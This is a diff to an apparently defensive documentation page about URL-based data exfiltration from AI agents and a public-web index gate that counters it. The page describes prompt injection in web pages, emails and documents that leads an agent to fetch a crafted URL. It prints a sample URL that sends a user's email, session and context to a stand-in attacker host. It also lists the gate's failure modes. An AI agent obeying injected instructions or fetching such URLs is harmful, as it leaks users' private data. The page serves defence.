@@ -20,7 +20,7 @@ maturity: established
 
 ## The Attack
 
-Attackers embed instructions in web content (pages, emails, documents) that instruct the agent to fetch a crafted URL containing private data in the query string:
+Attackers use [prompt injection](prompt-injection-threat-model.md) in web content (pages, emails, documents) to instruct the agent to fetch a crafted URL containing private data in the query string:
 
 ```
 https://attacker.example/collect?user=alice@corp.com&session=abc123&data=<context>
@@ -46,7 +46,7 @@ A domain allow-list answers the wrong question. [Source: [AI Agent Link Safety](
 
 The correct safety property is: a URL that was independently discoverable on the public web — with no access to the current user's session, context, or identity — cannot encode user-specific data.
 
-This leads to a public-web index gate: before fetching a URL automatically, cross-reference it against a crawl index built by a crawler that had no access to user data. If the exact URL appears in that index, it cannot contain user-specific secrets. If it does not appear, treat it as unverified and either block automatic fetching or surface it to the user with an explicit warning.
+This leads to a [public-web index gate](url-fetch-public-index-gate.md): before fetching a URL automatically, cross-reference it against a crawl index built by a crawler that had no access to user data. If the exact URL appears in that index, it cannot contain user-specific secrets. If it does not appear, treat it as unverified and either block automatic fetching or surface it to the user with an explicit warning.
 
 This tolerates the breadth of the internet better than allow-lists, which cause alert fatigue and train users to click through warnings. [Source: [AI Agent Link Safety](https://openai.com/index/ai-agent-link-safety/)]
 
@@ -65,10 +65,10 @@ Defenses against URL exfiltration layer with prompt injection defenses:
 The public-web index gate is not a complete solution. Three specific failure conditions apply:
 
 1. **Index coverage gaps**: Session-specific URLs — those with per-user tokens or dynamic state — are unlikely to appear in any public crawl index. The gate correctly flags these, but a determined attacker who pre-seeds a crafted URL into the index (via public pages that embed it) can still pass the check.
-2. **Newly published legitimate URLs**: Recently published pages that a public crawler has not yet indexed are blocked alongside attacker-crafted URLs. Agents that need to fetch fresh content will produce false positives that erode user trust in the warning system.
+2. **Newly published legitimate URLs**: Recently published pages that a public crawler has not yet indexed are blocked alongside attacker-crafted URLs. Agents that need to fetch fresh content will produce false positives that erode user trust in the [confirmation warnings](human-in-the-loop-confirmation-gates.md).
 3. **Non-URL exfiltration channels**: The index gate only protects against query-string exfiltration. DNS tunneling, timing side channels, and covert channels in request headers are not addressed. Teams that treat this control as a complete exfiltration defense will have a false sense of security.
 
-For deployments where these failure modes are unacceptable, strict egress controls — blocking all outbound network access from the agent process and allowing only explicitly whitelisted API endpoints — provide a stronger and simpler guarantee.
+For deployments where these failure modes are unacceptable, strict [egress controls](selective-network-sandbox-mode.md) — blocking all outbound network access from the agent process and allowing only explicitly whitelisted API endpoints — provide a stronger and simpler guarantee.
 
 ## Key Takeaways
 
